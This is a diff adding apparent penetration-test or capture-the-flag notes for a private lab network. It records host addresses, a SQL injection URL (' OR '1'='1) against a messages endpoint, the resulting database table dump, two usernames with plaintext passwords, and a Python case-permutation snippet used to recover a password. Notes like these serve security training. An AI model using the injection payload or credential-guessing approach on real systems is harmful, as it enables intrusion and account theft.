@@ -1,0 +1,221 @@
+nown Host 4
+10.102.102.200
+
+DC
+10.102.116.180
+
+Unknown Host 2
+10.102.68.219
+
+Unknown Host 5
+10.102.131.2
+
+Unknown Host 1
+10.102.126.197
+
+
+
+
+http://10.102.78.17/all_messages?to=' OR '1'='1
+
+
+
+tables
+0: all_plugins
+1: applicable_roles
+2: character_sets
+3: check_constraints
+4: collations
+5: collation_character_set_appli
+6: columns
+7: column_privileges
+8: enabled_roles
+9: engines
+10: events
+11: files
+12: global_status
+13: global_variables
+14: keywords
+15: key_caches
+16: key_column_usage
+17: parameters
+18: partitions
+19: plugins
+20: processlist
+21: profiling
+22: referential_constraints
+23: routines
+24: schemata
+25: schema_privileges
+26: session_status
+27: session_variables
+28: statistics
+29: sql_functions
+30: system_variables
+31: tables
+32: tablespaces
+33: table_constraints
+34: table_privileges
+35: triggers
+36: user_privileges
+37: views
+38: geometry_columns
+39: spatial_ref_sys
+40: client_statistics
+41: index_statistics
+42: innodb_sys_datafiles
+43: user_statistics
+44: innodb_sys_tablestats
+45: innodb_locks
+46: innodb_mutexes
+47: innodb_cmpmem
+48: innodb_cmp_per_index
+49: innodb_cmp
+50: innodb_ft_deleted
+51: innodb_cmp_reset
+52: innodb_lock_waits
+53: table_statistics
+54: innodb_tablespaces_encryption
+55: innodb_buffer_page_lru
+56: innodb_sys_fields
+57: innodb_cmpmem_reset
+58: innodb_sys_columns
+59: innodb_ft_index_table
+60: innodb_cmp_per_index_reset
+61: user_variables
+62: innodb_ft_index_cache
+63: innodb_sys_foreign_cols
+64: innodb_ft_being_deleted
+65: innodb_buffer_pool_stats
+66: innodb_trx
+67: innodb_sys_foreign
+68: innodb_sys_tables
+69: innodb_ft_default_stopword
+70: innodb_ft_config
+71: innodb_buffer_page
+72: innodb_sys_tablespaces
+73: innodb_metrics
+74: innodb_sys_indexes
+75: innodb_sys_virtual
+76: innodb_tablespaces_scrubbing
+77: innodb_sys_semaphore_waits
+78: column_stats
+79: columns_priv
+80: db
+81: event
+82: func
+83: general_log
+84: gtid_slave_pos
+85: help_category
+86: help_keyword
+87: help_relation
+88: help_topic
+89: host
+90: index_stats
+91: innodb_index_stats
+92: innodb_table_stats
+93: plugin
+94: proc
+95: procs_priv
+96: proxies_priv
+97: roles_mapping
+98: servers
+99: slow_log
+100: table_stats
+101: tables_priv
+102: time_zone
+103: time_zone_leap_second
+104: time_zone_name
+105: time_zone_transition
+106: time_zone_transition_type
+107: transaction_registry
+108: user
+109: cond_instances
+110: events_waits_current
+111: events_waits_history
+112: events_waits_history_long
+113: events_waits_summary_by_host_
+114: events_waits_summary_by_insta
+115: events_waits_summary_by_threa
+116: events_waits_summary_by_user_
+117: events_waits_summary_by_accou
+118: events_waits_summary_global_b
+119: file_instances
+120: file_summary_by_event_name
+121: file_summary_by_instance
+122: host_cache
+123: mutex_instances
+124: objects_summary_global_by_typ
+125: performance_timers
+126: rwlock_instances
+127: setup_actors
+128: setup_consumers
+129: setup_instruments
+130: setup_objects
+131: setup_timers
+132: table_io_waits_summary_by_ind
+133: table_io_waits_summary_by_tab
+134: table_lock_waits_summary_by_t
+135: threads
+136: events_stages_current
+137: events_stages_history
+138: events_stages_history_long
+139: events_stages_summary_by_thre
+140: events_stages_summary_by_acco
+141: events_stages_summary_by_user
+142: events_stages_summary_by_host
+143: events_stages_summary_global_
+144: events_statements_current
+145: events_statements_history
+146: events_statements_history_lon
+147: events_statements_summary_by_
+148: events_statements_summary_by_
+149: events_statements_summary_by_
+150: events_statements_summary_by_
+151: events_statements_summary_glo
+152: events_statements_summary_by_
+153: users
+154: accounts
+155: hosts
+156: socket_instances
+157: socket_summary_by_instance
+158: socket_summary_by_event_name
+159: session_connect_attrs
+160: session_account_connect_attrs
+161: messages
+162: windows_directory
+163: 
+164: 
+165: 
+166: 
+167: 
+
+
+
+
+messages - all stuff on the messages page
+0: message_id
+1: message_to
+2: message_from
+3: message_subject
+4: message_text
+
+
+
+windows_directory
+
+username                                          password
+========                                          ========
+b.mocarthy                                        wowmage60                                        
+artica-ftp-acc                                    0912jgf93fsnjf
+
+
+
+import itertools
+def combination(str1):
+    result = map(''.join, itertools.product(*((c.lower(), c.upper()) for c in str1)))
+    return list(result)
+
+
+
+password: 0912jgf93FSnjf
